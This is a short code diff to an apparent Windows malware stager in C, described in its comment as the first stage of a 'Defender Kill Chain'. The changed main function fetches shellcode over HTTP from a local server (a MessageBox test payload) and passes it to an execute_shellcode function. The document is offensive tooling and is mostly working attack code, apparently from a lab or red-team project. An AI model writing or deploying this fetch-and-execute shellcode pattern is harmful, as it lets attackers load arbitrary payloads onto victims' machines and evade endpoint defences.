@@ -1,5 +1,6 @@
 #include <windows.h>
 #include "webreq.h"
+#include <stdio.h>
 void execute_shellcode(char *shellcode);
 
 /************************************************************************
@@ -17,7 +18,8 @@ Description:  This file is the first stager in our Defender Kill Chain.
 
 
 int main() {
-    char* shellcode=fetch_url("127.0.0.1:3000/MessageBoxShellcode");
+    unsigned char* shellcode=fetch_url("http://localhost:3000/MessageBoxShellcode");
+    printf("%s", shellcode);
     execute_shellcode(shellcode);
 }
 
